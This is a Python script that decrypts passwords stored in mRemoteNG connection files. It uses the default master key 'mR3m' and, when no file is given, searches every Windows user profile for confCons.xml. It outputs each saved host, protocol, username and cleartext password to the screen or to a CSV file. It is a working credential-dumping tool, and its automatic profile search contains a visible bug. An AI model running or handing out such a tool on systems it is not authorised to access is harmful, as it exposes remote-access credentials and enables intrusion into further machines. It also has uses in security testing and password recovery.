#!/usr/bin/env python3

import sys
import argparse
import hashlib
import base64
import os.path
import csv
from Cryptodome.Cipher import AES
import xml.etree.ElementTree as ET

def xmlfile(value):
    if not value.endswith('.xml'):
        raise argparse.ArgumentTypeError(
            'Filetype must be .xml')
    return value

parser = argparse.ArgumentParser(description="Decrypt mRemoteNG passwords.")
parser.add_argument("-f", "--file", help="mRemoteNG confCons.xml file location", type=xmlfile)
parser.add_argument("-p", "--password", help="Custom Password", default="mR3m")
parser.add_argument("-o", "--output", help="Output results to specified file in csv format")
args = parser.parse_args()
configFile = []

if args.file != None:
  configFile.append(args.file)

elif os.path.exists(r'C:\Users'):
  print ('Searching users for config file...\n')
  for user in os.listdir(r'C:\Users'):
    if os.path.exists('C:/Users/'+user+'/appdata/roaming/mRemoteNG/confCons.xml'):
      configFile.extend('C:/Users/'+user+'/appdata/roaming/mRemoteNG/confCons.xml')
      print ('Found config file for: ' + user+ '\n')

else:
  print('mRemoteNG config file not found. Specify a file with -f')
  sys.exit(1)

def Decrypt(encryptedPass):
  if encryptedPass != '':
    encryptedPass = base64.b64decode(encryptedPass)
    salt = encryptedPass[:16]
    associated_data = encryptedPass[:16]
    nonce = encryptedPass[16:32]
    ciphertext = encryptedPass[32:-16]
    tag = encryptedPass[-16:]
    key = hashlib.pbkdf2_hmac("sha1", args.password.encode(), salt, 1000, dklen=32)

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    cipher.update(associated_data)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode("utf-8")
  else:
    return encryptedPass

if args.output != None:
  with open(args.output, 'w') as csvfile:
    filewriter = csv.writer(csvfile)
    filewriter.writerow(['Domain', 'Name', 'Host', 'Port', 'Protocol', 'User', 'Password'])

for item in configFile:
  item = ET.parse(item)
  root=item.getroot()

  for Node in root.iter('Node'):
    Domain = Node.get('Domain')
    Name = Node.get('Name')
    Host = Node.get('Hostname')
    Port = Node.get('Port')
    Protocol = Node.get('Protocol')
    User = Node.get('Username')
    Pass = Decrypt(Node.get('Password'))

    if args.output != None:
     with open(args.output, 'a') as csvfile:
      filewriter = csv.writer(csvfile)
      filewriter.writerow([Domain, Name, Host, Port, Protocol, User, Pass])

    else:
      print (Domain + ' | ' + Name + ' | ' + Host + ' | ' + Port + ' | ' + Protocol + ' | ' + User + ' | ' + Pass)




